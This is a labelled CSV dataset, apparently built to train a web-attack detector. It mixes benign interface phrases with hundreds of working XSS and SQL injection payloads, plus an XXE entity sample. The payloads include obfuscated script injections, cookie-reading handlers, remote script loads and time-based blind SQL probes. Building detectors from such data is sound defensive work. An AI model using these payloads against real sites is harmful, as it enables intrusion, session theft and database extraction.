input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",1,87,4.485541847505754,2,0,0,0.13793103289734446
change your password,0,20,3.8219280948873626,0,0,0,0.0
"<a href=""about:<script>document.vulnerable=true;</script>"">",1,59,4.529279126786175,2,1,0,0.23728813157138762
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.864659425750382,4,0,0,0.22784809838166964
1 or pg_sleep(5)--,2,18,3.7254805569978675,0,0,0,0.27777776234567986
"<script>alert(String.fromCharCode(88,83,83))</script>",1,53,4.5531155016105505,0,1,0,0.22641509006763982
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,132,3.973675720179363,2,0,1,0.2272727255509642
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
veris-->group<svg/onload=alert(/XSS/)//,1,39,4.333622334791383,0,0,0,0.3076922998027616
ORDER BY 12,2,11,3.095795255000934,0,0,0,0.0
"<img src=x onerror=\x10""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
<IMG SRC=javascript:javascript:alert(1)>,1,40,4.443942707918269,0,0,0,0.17499999562500013
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,56,4.6685256807930084,2,0,0,0.33928570822704096
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1,42,4.927798970294785,4,0,0,0.3333333253968256
"><img src=x onerror=javascript:alert(`1`)>
><img src=x onerror=javascript:alert(('1'))>",1,87,4.534448093350938,2,0,0,0.25287356031179814
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",1,61,4.701332116912215,2,0,0,0.3278688470841173
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",2,102,4.112260145299171,6,0,1,0.3529411730103807
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,1,66,4.581585976267782,0,0,0,0.28787878351698815
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1,131,4.008203440287082,4,1,0,0.24427480729561216
submit your feedback,0,20,3.9219280948873627,0,0,0,0.0
"<body onload=""document.vulnerable=true;"">",1,41,4.210733711724087,2,0,0,0.19512194646044034
"and (select substring(@@version,3,1))='X'",2,41,4.491459931341817,2,0,1,0.26829267638310544
<img/src=@&#32;&#13; onerror = prompt('&#49;'),1,46,4.536951565073227,2,0,0,0.3913043393194709
waitfor delay '00:00:05'--,2,26,3.8692996998935225,2,0,0,0.23076922189349144
"<img src=""javascript:alert('XSS');"">",1,36,4.516875695766563,4,0,0,0.3055555470679015
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
&#x03c,1,6,2.584962500721156,0,0,0,0.33333327777778704
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1,136,3.559951012166407,0,0,0,0.5294117608131488
"<body onLoad=""alert('XSS');""",1,28,4.280394654123195,4,0,0,0.32142855994898
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,1,64,4.241729296672175,0,1,0,0.4062499936523439
"<img src\x12=x onerror=""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
"<IMG onmouseover=""alert('xxs')"">",1,32,4.390319531114783,4,0,0,0.2812499912109378
OR x=x#,2,7,2.521640636343318,0,0,0,0.285714244897965
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1,60,5.067481795998514,4,0,0,0.23333332944444451
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1,85,4.660163842827091,2,0,0,0.34117646657439454
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,1,60,4.333496795710052,0,0,0,0.3666666605555557
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1,76,4.603329555883614,4,0,0,0.24999999671052636
"<XSS STYLE=""behavior: url(%(htc)s);"">",1,37,4.756618568273181,2,0,0,0.3243243155588023
submit your feedback,0,20,3.9219280948873627,0,0,0,0.0
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",1,84,4.545001614123105,2,0,0,0.1428571411564626
<script <B>document.vulnerable=true;</script>,1,45,4.374860596185444,0,0,0,0.19999999555555567
-',2,2,1.0,1,0,0,0.99999950000025
upload profile picture,0,22,3.6069367321753214,0,0,0,0.0
ORDER BY 16#,2,12,3.2516291673878226,0,0,0,0.08333332638888948
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",2,60,4.4892464285091584,2,0,0,0.2999999950000001
¼script¾alert(¢XSS¢)¼/script¾,1,29,3.9783335811852636,0,0,0,0.3103448168846615
"<A HREF=""htt",1,12,3.4182958340544896,1,0,0,0.2499999791666684
"<;DIV STYLE="";background-image: url(javascript:alert(';XSS';))"";>;",1,66,5.046298619647436,4,0,0,0.30303029843893486
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",1,78,4.407743554773552,2,0,0,0.1538461518737673
new user registration,0,21,3.463280517810811,0,0,0,0.0
<body ONLOAD=document.vulnerable=true;>,1,39,4.496815359832416,0,0,0,0.1538461499013808
"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",1,69,4.39108252251704,2,0,0,0.173913040957782
eval(a+b+c+d);,1,14,3.3248629576173565,0,0,0,0.42857139795918586
"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",1,67,4.1097099901648795,6,0,0,0.43283581443528635
"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",1,60,4.889898095464288,2,0,0,0.21666666305555562
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,157,3.765734621578169,2,0,1,0.2229299348857966
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,147,3.8438371585789213,2,0,1,0.2244897943912259
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",1,67,4.528869511954922,2,0,0,0.2835820853196704
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",2,86,3.659395835608415,0,0,1,0.30232557787993514
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;,1,63,4.3122981300145025,0,0,0,0.3333333280423281
"<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",1,69,4.528905348666706,6,0,0,0.3043478216761185
ORDER BY SLEEP(5)#,2,18,3.6835423624332306,0,0,0,0.1666666574074079
"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",1,57,4.56379007683777,2,0,0,0.26315789012003704
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",1,302,3.7641566648927807,2,0,0,0.4039735085961142
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",1,149,4.094618037104945,0,0,0,0.36912751430115764
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,1,59,4.235570644451101,0,0,0,0.40677965412237876
<b <script>alert(1)</script>0,1,29,4.021268494903765,0,1,0,0.27586205945303244
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,1,51,4.632826322193968,0,0,0,0.2549019557862362
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",1,63,4.364838511984457,2,0,0,0.22222221869488543
AS INJECTX WHERE 1=1 AND 1=0,2,28,3.838804369244613,0,0,0,0.07142856887755111
"<img\x47src=x onerror=""javascript:alert(1)"">",1,44,4.589780198035243,2,0,0,0.22727272210743815
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,1,60,4.769146220500345,2,1,0,0.39999999333333347
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;",1,58,4.128282393102394,2,0,0,0.36206895927467314
HAVING 1=1,2,10,3.1219280948873624,0,0,0,0.09999999000000101
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,192,3.5366703360573455,2,0,1,0.2187499988606771
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,167,3.6937296243368962,2,0,1,0.22155688490085698
OR x=y#,2,7,2.8073549220576037,0,0,0,0.285714244897965
&&SLEEP(5)--,2,12,3.084962500721156,0,0,0,0.4999999583333368
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;,1,122,5.241497154042461,2,0,0,0.22950819484009677
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1,52,4.587472353123261,2,0,0,0.30769230177514806
"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",1,64,4.779078664259099,2,0,0,0.20312499682617194
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",2,122,4.408506164253461,0,0,1,0.2622950798172535
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1,43,4.943592952326203,4,0,0,0.23255813412655504
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",1,75,4.556854071114561,2,0,0,0.1599999978666667
<!--[if]><script>javascript:alert(1)</script -->,1,48,4.323934896284055,0,1,0,0.35416665928819463
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-,1,175,5.07493978601494,0,0,0,0.2571428556734694
"<a href=""javascript#document.vulnerable=true;"">",1,47,4.509494905320961,2,0,0,0.19148935762788602
"<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",1,69,4.528905348666706,6,0,0,0.3043478216761185
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,1,41,3.9739164935644116,0,0,0,0.31707316299821553
" or sleep(5)#
' or sleep(5)#
 or sleep(5)=""",2,43,3.7272263820053158,2,0,0,0.25581394753921055
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",1,88,4.834980375449217,6,0,0,0.44318181314566124
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",2,70,3.6713679706891322,0,0,1,0.2857142816326531
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",1,72,4.648152342896522,0,1,0,0.20833333043981486
"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
http://www.google<script .com>alert(document.location)</script,1,62,4.392744698282444,0,0,0,0.19354838397502608
"<% foo><x foo=""%><script>alert(123)</script>"">",1,46,4.368792054344758,2,1,0,0.3695652093572781
"&lt;SCRIPT a=\""&gt;'&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1,96,4.670143335273225,5,0,0,0.40624999576822923
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",2,46,3.8705380426372793,0,0,1,0.2608695595463139
<;/br style=a:expression(alert())>;,1,35,4.286146588249911,0,0,0,0.3142857053061227
<input onfocus=write(XSS) autofocus>,1,36,4.204511459715549,0,0,0,0.1388888850308643
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",1,71,4.957786690165377,2,1,0,0.30985915056536406
welcome to the site,0,19,3.221097250057957,0,0,0,0.0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",2,140,4.410341880033929,2,0,1,0.30714285494897964
ORDER BY 28#,2,12,3.2516291673878226,0,0,0,0.08333332638888948
AND 7300=7300 AND ('pKlZ'='pKlY,2,31,3.808719697344071,3,0,0,0.19354838085327802
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,1,174,4.848629526159054,0,0,0,0.2298850561500859
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1,60,4.842318879259731,2,0,0,0.21666666305555562
"<BGSOUND SRC=""javascript:alert('XSS');"">",1,40,4.803055907333276,4,0,0,0.2749999931250002
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,1,39,4.3748951674692504,0,1,0,0.2820512748191981
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,1,60,4.631401845392172,2,0,0,0.2999999950000001
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",1,72,4.464230557685719,2,0,0,0.26388888522376547
"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",1,170,4.667860706847773,8,0,0,0.2470588220761246
&#X003c;,1,8,2.75,0,0,0,0.3749999531250059
&#0000060,1,9,1.4466166676282082,0,0,0,0.22222219753086697
WHERE 1=1 AND 1=0--,2,19,3.431623565847431,0,0,0,0.21052630470914185
"<img \x47src=x onerror=""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,1,121,5.112939584941018,0,0,0,0.1570247920907042
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",2,61,4.60624573888303,2,0,0,0.21311475060467622
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",1,76,4.76248207937015,2,1,0,0.2894736804016621
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",1,64,4.970060203736037,2,0,0,0.32812499487304697
&#x000003C,1,10,2.1609640474436813,0,0,0,0.19999998000000202
AS INJECTX WHERE 1=1 AND 1=1,2,28,3.72290749432188,0,0,0,0.07142856887755111
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",2,177,3.6272411070214683,2,0,1,0.22033898180599445
contact support team,0,20,3.4219280948873627,0,0,0,0.0
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1,127,5.13504823667667,6,0,0,0.2598425176390353
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",2,69,4.539239312756518,2,0,1,0.26086956143667306
"<BR SIZE=""&{javascript:alert(1)}"">",1,34,4.771142620598472,2,0,0,0.32352940224913523
&lt;? echo('&lt;SCR)';,1,22,3.8796640049025943,2,0,0,0.4545454338842984
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",1,109,4.630031572245168,0,0,0,0.2568807315882502
"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",1,75,5.123567317301466,2,0,0,0.33333332888888895
reset your password,0,19,3.431623565847431,0,0,0,0.0
"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",1,54,4.481352318215932,2,0,0,0.25925925445816195
) or true--,2,11,2.913977073182752,0,0,0,0.2727272479338866
"UNION ALL SELECT 1,2,3,4#",2,25,3.9132696895151087,0,0,1,0.15999999360000025
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",2,77,4.217260079290679,6,0,1,0.35064934609546305
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",1,240,5.25573098642429,12,0,0,0.23333333236111112
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",1,87,4.491176617570962,2,0,0,0.13793103289734446
<img src=&{document.vulnerable=true;};>,1,39,4.477459270033353,0,0,0,0.25641024983563465
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)=",2,316,4.693418536135184,7,0,1,0.25949367006489343
ORDER BY 21--,2,13,3.238901256602631,0,0,0,0.15384614201183525
ORDER BY 3,2,10,2.9219280948873623,0,0,0,0.0
reset your password,0,19,3.431623565847431,0,0,0,0.0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",2,113,4.505969744070778,2,0,1,0.3008849530895137
"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",1,103,5.347535449530452,2,1,0,0.18446601762654352
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1,65,4.660775605889718,4,0,0,0.21538461207100598
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",1,90,4.884249730425209,4,0,0,0.32222221864197537
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1,44,5.033184175406309,4,0,0,0.22727272210743815
&#x000003c,1,10,2.1609640474436813,0,0,0,0.19999998000000202
newsletter subscribed,0,21,3.499227541723357,0,0,0,0.0
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",1,87,4.597442278465635,2,0,0,0.13793103289734446
"<IMG LOWSRC=""javascript:alert('XSS')"">",1,38,4.78714396069814,4,0,0,0.26315788781163457
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",2,74,4.344939806549713,2,0,0,0.29729729327976634
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",2,52,4.214204862080625,6,0,1,0.34615383949704154
"<img src=""livescript:document.vulnerable=true;"">",1,48,4.431127542695028,2,0,0,0.1874999960937501
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",2,101,4.171881468801942,2,0,0,0.3069306900303892
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",1,113,4.848315914130578,4,0,0,0.28318583820189525
<body/onload=&lt;!--&gt;&#10alert(1)>,1,37,4.4251412032329,0,0,0,0.4054053944485029
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1,42,4.927798970294785,4,0,0,0.3333333253968256
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",1,64,4.947123781480403,2,0,0,0.20312499682617194
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;,1,115,4.727229161903415,0,0,0,0.24347825875236298
"<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",1,56,5.280394654123195,2,0,0,0.6607142739158166
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1,91,4.617822805919774,0,0,0,0.24175823910155783
<script>+-+-1-+-+alert(1)</script>,1,34,3.9254106352407234,0,1,0,0.44117645761245716
&#x0003C,1,8,2.4056390622295662,0,0,0,0.24999996875000394
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",1,101,4.685335584996687,2,1,0,0.23762376002352714
view product details,0,20,3.8219280948873626,0,0,0,0.0
‘)alert(1);//,1,13,3.3927474104487847,0,0,0,0.5384614970414233
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",1,88,5.113094551420763,4,0,0,0.23863636092458682
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///dev/random"">]><foo>&xee;</foo>",1,135,5.188837699096536,6,0,0,0.2814814793964335
"><img src=x onerror=javascript:alert((`1`))>
><img src=x onerror=javascript:alert(A)>",1,85,4.503048582992904,0,0,0,0.23529411487889276
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",1,99,4.820690627525281,4,0,0,0.2626262599734721
&#060,1,5,1.9219280948873623,0,0,0,0.399999920000016
&#X0003C;,1,9,2.6416041678685938,0,0,0,0.33333329629630043
"<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",1,67,4.469168019417609,4,0,0,0.2835820853196704
"<img src=x onerror=\x32""javascript:alert(1)"">",1,45,4.597082818407666,2,0,0,0.22222221728395075
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>,1,43,4.99010458023318,0,0,0,0.23255813412655504
&<script>document.vulnerable=true;</script>,1,43,4.3213862662293785,0,1,0,0.20930232071389954
"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<;STYLE>;li {list-style-image: url("";javascript:alert(&#39;XSS&#39;)"";);}<;/STYLE>;<;UL>;<;LI>;XSS",1,98,4.926038473491857,2,0,0,0.38775509808413167
&lt;HTML xmlns:xss&gt;,1,22,3.788754913993503,0,0,0,0.2272727169421492
file uploaded successfully,0,26,3.5364142371222305,0,0,0,0.0
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1,44,4.834209459448049,4,0,0,0.3181818109504134
read the documentation,0,22,3.572623663895164,0,0,0,0.0
"and (select substring(@@version,1,1))='M'",2,41,4.442679443536939,2,0,1,0.26829267638310544
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#",2,58,4.420324478140431,0,0,1,0.20689654815695607
ORDER BY 26--,2,13,3.238901256602631,0,0,0,0.15384614201183525
"<img \x00src=x onerror=""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:document.vulnerable=true;"">",1,93,5.147759989427842,4,0,0,0.21505376112845417
"<script src=""data:text/javascript,alert(1)""></script>",1,53,4.249042333665015,2,0,0,0.24528301423994314
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,1,112,4.587189999000113,0,0,0,0.1696428556281888
"<img src\x13=x onerror=""javascript:alert(1)"">",1,45,4.552638373963221,2,0,0,0.22222221728395075
"<img src=x\x13onerror=""javascript:alert(1)"">",1,44,4.544325652580697,2,0,0,0.22727272210743815
OR 1=1#,2,7,2.521640636343318,0,0,1,0.285714244897965
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",1,64,4.915873781480403,2,0,0,0.20312499682617194
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",2,74,4.237999697395544,6,0,1,0.3513513466033602
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",1,90,4.523534247683985,2,0,0,0.13333333185185187
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,1,76,4.71664071811536,2,0,0,0.2763157858379502
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",1,62,4.891707552629984,2,0,0,0.20967741597294492
